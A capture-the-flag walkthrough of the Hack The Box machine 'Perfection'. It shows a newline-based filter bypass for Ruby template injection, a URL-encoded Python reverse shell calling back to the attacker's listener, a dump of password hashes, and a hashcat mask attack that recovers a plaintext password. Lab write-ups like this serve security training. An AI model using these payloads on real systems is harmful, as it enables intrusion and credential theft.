# Perfection

## Initial Nmap Scan

```
┌─[support@parrot]─[~/Documents/HTB/boxes/perfection]
└──╼ $sudo nmap -sS -sV -oA perfection_initial 10.10.11.253
[sudo] password for support: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-02 14:43 EDT
Nmap scan report for 10.10.11.253
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.89 seconds
```

## Nginx HTTP Server

### "Powered by WEBrick"

<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

### Whatweb

```
┌─[support@parrot]─[~/Documents/HTB/boxes/perfection]
└──╼ $whatweb http://10.10.11.253
http://10.10.11.253 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx, WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)], IP[10.10.11.253], PoweredBy[WEBrick], Ruby[3.0.2], Script, Title[Weighted Grade Calculator], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]
```

* nginx, webrick 1.7.0, ruby 3.0.2

### Grade Calculator

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

#### Testing the form

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### Ruby Server Side Template Injection

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption><p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p></figcaption></figure>

### Burp

* Lets use burp to test some ruby SSTI

```
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.253/weighted-grade
Content-Type: application/x-www-form-urlencoded
Content-Length: 177
Origin: http://10.10.11.253
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

category1=TEST&grade1=100&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
```

<figure><img src=".gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

* Getting "Malicious Input Detected".  Maybe there is a way around this or an escape character?

<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

```
TEST+\n 
<%= `id` %>
```

* The new line character URL encoded (`%0a)` worked as a way to bypass their filters.

```
TEST+%0a+<%25%3d+`id`+%25>
```

### Reverse Shell

* Now lets see if we can use a URL encoded reverse shell.
* [https://www.revshells.com/](https://www.revshells.com/)

<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

```
┌─[support@parrot]─[~/Documents/HTB/boxes/perfection]
└──╼ $nc -lvnp 9001
listening on [any] 9001 ...
```

<figure><img src=".gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

* No luck with bash shell

<figure><img src=".gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

* No luck with curl. Got a connection, but its not returning responses from input.

<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

* Python3 works!

```
category1=TEST+%0a<%25%3d`export%20RHOST%3D%2210.10.16.48%22%3Bexport%20RPORT%3D9001%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27`%25>&grade1=100&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
```

<figure><img src=".gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

## Logged in as susan

### Upgrading shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
susan@perfection:~/ruby_app$ 
```

### Looking for interesting files

```bash
susan@perfection:~/ruby_app$ ls
ls
main.rb  public  views
susan@perfection:~/ruby_app$ cd ../
cd ../
susan@perfection:~$ ls -la
ls -la
total 52
drwxr-x--- 8 susan susan 4096 May  2 06:22 .
drwxr-xr-x 3 root  root  4096 Oct 27  2023 ..
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .bash_history -> /dev/null
-rw-r--r-- 1 susan susan  220 Feb 27  2023 .bash_logout
-rw-r--r-- 1 susan susan 3771 Feb 27  2023 .bashrc
drwx------ 2 susan susan 4096 Oct 27  2023 .cache
drwx------ 3 susan susan 4096 May  2 08:43 .gnupg
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .lesshst -> /dev/null
drwxrwxr-x 3 susan susan 4096 Oct 27  2023 .local
drwxr-xr-x 2 root  root  4096 Oct 27  2023 Migration
-rw-r--r-- 1 susan susan  807 Feb 27  2023 .profile
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .python_history -> /dev/null
drwxr-xr-x 4 root  susan 4096 Oct 27  2023 ruby_app
lrwxrwxrwx 1 root  root     9 May 14  2023 .sqlite_history -> /dev/null
drwxrwxr-x 2 susan susan 4096 May  2 06:24 .ssh
-rw-r--r-- 1 susan susan    0 Oct 27  2023 .sudo_as_admin_successful
-rw-r----- 1 root  susan   33 May  2 06:21 user.txt
-rw-r--r-- 1 susan susan   39 Oct 17  2023 .vimrc
susan@perfection:~$ cat user.txt
cat user.txt
0bb4beec5564c84cfa907870261db8cc
```

```
susan@perfection:~$ ls -la Migration                 
ls -la Migration
total 16
drwxr-xr-x 2 root  root  4096 Oct 27  2023 .
drwxr-x--- 8 susan susan 4096 May  2 06:22 ..
-rw-r--r-- 1 root  root  8192 May 14  2023 pupilpath_credentials.db
susan@perfection:~$ cat Migration/pupilpath_credentials.db
cat Migration/pupilpath_credentials.db
��^�ableusersusersCREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
a�\
Susan Miller
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```

* There's a database backup from a Migration, that has Susan's password hash.
* I downloaded the db file to my local machines and opened it with sqlite3

```bash
┌─[✗]─[support@parrot]─[~/Documents/HTB/boxes/perfection]
└──╼ $sqlite3 pupilpath_credentials.db 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

### Enumeration

#### LinPeas

* There is mail for susan.

```
╔══════════╣ Mails (limit 50)
    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/mail/susan
    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/spool/mail/susan
```

<pre><code>Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

<strong>{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
</strong>
Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
</code></pre>

### Cracking Hashes

```bash
hashcat -m 1400 -a3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f "susan_nasus_?d?d?d?d?d?d?d?d?d?d" --increment --increment-min=1
```

```
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

```
susan_nasus_413759210
```

## SSH

```
susan@perfection:~$ sudo -l
[sudo] password for susan:
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```

* susan can run all commands as root with sudo

### Privilege Escalation

```
susan@perfection:~$ sudo cat /root/root.txt
834ba25a3bea641a37fcd95bd518d293
```

***

## Things Learned

* Server side template injection
* Using bypass characters to get past character filters&#x20;
* Always check for user mail on the box
* Hashcat bruteforcing incremental numbers
